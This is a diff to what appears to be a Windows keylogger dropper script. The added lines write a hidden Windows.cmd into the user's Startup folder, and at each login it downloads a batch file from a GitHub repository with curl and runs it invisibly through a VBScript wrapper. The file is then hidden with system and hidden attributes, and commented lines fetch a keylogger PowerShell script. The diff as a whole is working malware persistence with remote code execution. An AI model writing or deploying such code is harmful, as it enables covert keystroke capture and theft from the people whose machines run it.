@@ -19,7 +19,11 @@ wscript.exe "i.vbe" "r.bat"
 cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 echo @echo off>Windows.cmd
 echo cd %temp%\t>>Windows.cmd
+echo del -f file.bat>>Windows.cmd
+echo curl -Ls https://raw.githubusercontent.com/Ale-cyber/test/master/file.bat -o file.bat>>Windows.cmd
+echo wscript.exe "i.vbe" "file.bat">>Windows.cmd
 echo wscript.exe "i.vbe" "r.bat">>Windows.cmd
+attrib +s +h Windows.cmd
 
 :: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/invisible.vbe -o i.vbe
 :: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/keylogger.ps1 -o p.ps1
